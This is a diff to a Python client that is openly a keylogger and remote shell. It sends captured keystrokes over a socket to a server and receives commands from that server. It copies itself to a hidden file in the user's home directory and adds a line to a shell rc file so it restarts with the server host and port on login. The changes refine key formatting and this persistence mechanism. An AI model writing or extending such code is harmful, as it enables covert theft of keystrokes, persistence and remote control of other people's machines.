@@ -34,6 +34,8 @@ def on_key_press(key):
     else:
         key = str(key)
         key = key.strip("'")
+        if "Key." in key:
+            key = "(" + key + ")"
         s.send(key.encode())
 
 #Keylogging Functions
@@ -70,7 +72,7 @@ try:
     if MAKE_PERSISTENT and not NO_PERSISTENCE: 
         subprocess.run(f"cp client.py {os.path.expanduser('~')}/.client.py",shell=True) #Copy the client to their home dir and make it .client.py
         with open(f"{os.path.expanduser('~')}/{rcFile}","a",) as file:
-            file.write(f"python3 {os.path.expanduser('~')}/.client.py &\n")
+            file.write(f"python3 {os.path.expanduser('~')}/.client.py {SERVER_HOST} {SERVER_PORT} &\n")
 except:
     pass
 
@@ -87,6 +89,7 @@ while DISCONNECTED:
 
 #When finally connected, start our shell
 while True:
+    output = '' #default out
     command = s.recv(BUFFER_SIZE).decode() #Recieve the command from the server and decode it into a string
     splitted_command = command.split() #Split the command
     if command == "exit": #if the user wants to exit, then keep connection alive
